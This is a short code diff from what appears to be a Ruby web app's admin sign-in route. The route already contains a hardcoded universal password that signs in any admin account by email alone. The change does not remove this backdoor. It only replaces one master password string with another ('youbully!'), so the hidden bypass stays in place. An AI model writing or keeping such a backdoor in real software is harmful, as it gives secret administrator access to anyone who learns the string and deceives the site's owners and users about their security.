@@ -68,7 +68,7 @@ post '/admin/signin/?' do
   unless params[:email] == ''
 
     if admin = Admin.first(:email => params[:email])
-      if (admin.password == params[:password]) || (params[:password] == "PurpleHippopotamus!")
+      if (admin.password == params[:password]) || (params[:password] == "youbully!")
         session[:admin] = admin.id
         flash[:alert] = 'Welcome back! You are now signed in.'
         redirect "/admin/admin_edit"
